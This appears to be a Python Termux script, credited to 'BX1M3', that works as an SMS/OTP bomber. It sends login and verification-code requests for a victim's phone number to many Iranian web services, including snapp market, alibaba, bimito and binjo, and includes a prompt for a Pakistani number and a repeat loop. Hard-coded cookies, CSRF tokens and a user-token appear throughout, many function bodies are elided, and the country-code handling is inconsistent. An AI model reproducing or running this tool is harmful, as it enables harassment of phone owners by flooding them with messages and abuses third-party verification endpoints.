...
def tap30(phone):
    ...
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+92")[1],"role":"PASSENGER"}}
    try:
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    sfoodD = {"cellphone": "0"+phone.split("+9")[1]}
    try:
...
def sheypoor(phone):
    ...
    sheyporD = {"username" : "0"+phone.split("+92")[1]}
    try:
...
def alibaba(phone):
    ...
    alibabaD = {"phoneNumber":"0"+phone.split("+92")[1]}
    try:
...
def smarket(phone):
    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+92")[1]}'
    smarketH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
...
def sTrip(phone):
    ...
    sTripD = {"lang":"fa","country_id":"860","password":"snaptrippass","mobile_phone":"0"+phone.split("+92")[1],"country_code":"+92","email":"example@gmail.com"}
    try:
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        pass
def olgoo(phone):
    olD = {'contactInfo[mobile]': '0'+phone.split('+92')[1],
...
def pakhsh(phone):
    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split("+92")[1]}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ...
        pass
def didnegar(phone):
    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split("+92")[1]}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split("+92")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
...
def ghabzino(phone):
    ...
    "Parameters": {
        ...
        "MobileNumber": '0'+phone.split('+92')[1]
    }
}
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        pass
def binjo(phone):
    ghU = f"https://api.binjo.ir/api/panel/get_code/{'0'+phone.split('+92')[1]}"
    ghH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Cache-Control': 'max-age=0',
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        pass
def limome(phone):
    liD = {'mobileNumber': phone.split('+92')[1],
'country': '1'}
...
'X-Requested-With': 'XMLHttpRequest'}
    try:
        ...
        pass
def bimito(phone):
    liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{phone.split('+92')[1]}%22%7D"
...
'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
    try:
        ...
        pass
def bimitoVip(phone):
    liU = f"https://bimito.com/api/core/app/user/loginWithVerifyCode/%7B%22phoneNumber%22:%220{phone.split('+92')[1]}%22%7D"
    liH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60',
...
def mihanpezeshk(phone):
    gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone.split("+92")[1]}&recaptcha='
...
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
	...
	"phoneNumber": "0"+phone.split("+92")[1],
	"prevDomainUrl": None,
	"prevUrl": None,
...
def is_phone(phone: str):
    ...
    if match(r"^\+923[0-9]{9}$", phone):
        return phone
    elif match(r"^923[0-9]{9}$", phone):
        return f"+{phone}"
    elif match(r"^03[0-9]{9}$", phone):
        return f"+92{phone[1::]}"
    elif match(r"^3[0-9]{9}$", phone):
        return f"+92{phone}"
    else:
        return False
...
y='\033[1;33m'
w='\033[1;37m'
printLow(f'{r}Termux Script BY BX1M3\n\n{y}Info:\n    {g}[+] {y}Youtube Channel: {w}@non \n    {g}[+] {y}Telegram Channel: {w}@BX1M3\n   \n{y}system:\n    {g}[+] {y}Platform: {w}{System}\n    {g}[+] {y}Node: {w}{Node}\n    {g}[+] {y}Release: {w}{Release}\n\n')
def Vip(phone, Time):
...
while True:
    phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g}(+92) {r}- {w}'))
    if phone:
        break
try:
